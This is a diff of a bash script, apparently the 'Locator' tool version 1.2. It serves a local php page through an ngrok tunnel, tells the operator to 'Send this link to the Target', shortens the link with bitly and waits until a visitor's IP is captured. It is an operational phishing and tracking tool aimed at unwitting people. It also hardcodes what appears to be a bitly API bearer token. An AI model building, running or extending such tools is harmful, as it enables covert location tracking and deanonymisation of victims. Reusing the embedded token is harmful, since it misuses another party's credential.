@@ -23,19 +23,19 @@ checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
 if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
+	pkill -f -2 ngrok > /dev/null 2>&1
+	killall -2 ngrok > /dev/null 2>&1
 fi
 if [[ $checkphp == *'php'* ]]; then
-pkill -f -2 php > /dev/null 2>&1
-killall -2 php > /dev/null 2>&1
+	pkill -f -2 php > /dev/null 2>&1
+	killall -2 php > /dev/null 2>&1
 fi
 if [[ $checkssh == *'ssh'* ]]; then
-pkill -f -2 ssh > /dev/null 2>&1
-killall ssh > /dev/null 2>&1
+	pkill -f -2 ssh > /dev/null 2>&1
+	killall ssh > /dev/null 2>&1
 fi
 if [[ -e sendlink ]]; then
-rm -rf sendlink
+	rm -rf sendlink
 fi
 
 
@@ -262,8 +262,8 @@ rm -rf server/error.txt
 
 fi
 
-default_port="55333" #$(seq 1111 4444 | sort -R | head -n1)
-printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m 55333 \e[0m\e[1;92m): \e[0m' $default_port
+default_port=$(seq 1111 4444 | sort -R | head -n1)
+printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
 serverx
@@ -287,6 +287,17 @@ if [[ -e server/error.txt ]]; then
 rm -rf server/error.txt
 
 fi
+
+if [[ -e jq ]]; then
+echo ""
+else
+printf "\e[1;92m[\e[0m*\e[1;92m] Downloading jq...\n"
+wget https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
+mv jq-linux64 jq
+chmod +x jq
+fi
+
+
 if [[ -e ngrok ]]; then
 echo ""
 else
@@ -324,14 +335,21 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-php -t "server/" -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+php -t "server/" -S 127.0.0.1:8080 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
+./ngrok http 80 > /dev/null 2>&1 &
+sleep 5
 
-link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
+#link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | ./jq -r '.tunnels[0].public_url' > link.txt)
+send_link=$(cat link.txt)
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $send_link
+#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$link)
+
+bitly=$(curl -s --location --request POST 'https://api-ssl.bitly.com/v4/shorten' --header 'Authorization: Bearer 4829231012ed0febfc5a1cb741df0f2e934abe40' --header 'Content-Type: application/json' --data-raw '{"long_url": "'$send_link'"}' | ./jq -r '.id')
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using bitly:\e[0m\e[1;77m %s \n' $bitly
+printf "\n"
 checkfound
 }
 
@@ -363,9 +381,13 @@ while [ true ]; do
 
 
 if [[ -e "server/ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
-catch_ip
-
+  a=$(grep -o bitly server/ip.txt)
+  if [[ $a != bitly ]]; then
+    printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
+    catch_ip
+  else
+    rm -f server/ip.txt
+  fi
 fi
 sleep 1
 done 
@@ -379,10 +401,10 @@ printf "\e[1;93m (_)                             \e[0m\e[1;77m_                 
 printf "\e[1;77m  _        ___    ____  _____  _| |_  ___    ____  \e[0m\n"
 printf "\e[1;77m | |      / _ \  / ___)(____ |(_   _)/ _ \  / ___) \e[0m\n"
 printf "\e[1;77m | |_____| |_| |( (___ / ___ |  | |_| |_| || |     \e[0m\n"
-printf "\e[1;77m |_______)\___/  \____)\_____|   \__)\___/ |_|    v1.1 \e[0m\n"
+printf "\e[1;77m |_______)\___/  \____)\_____|   \__)\___/ |_|    v1.2 \e[0m\n"
 printf "\n"
 printf "\e[1;93m :::\e[0m\e[1;77m Coded by: @thelinuxchoice\e[0m\n"
-
+printf "\e[1;93m :::\e[0m\e[1;77m Modified by: @itdaglog\e[0m\n"
 }
 banner
 dependencies
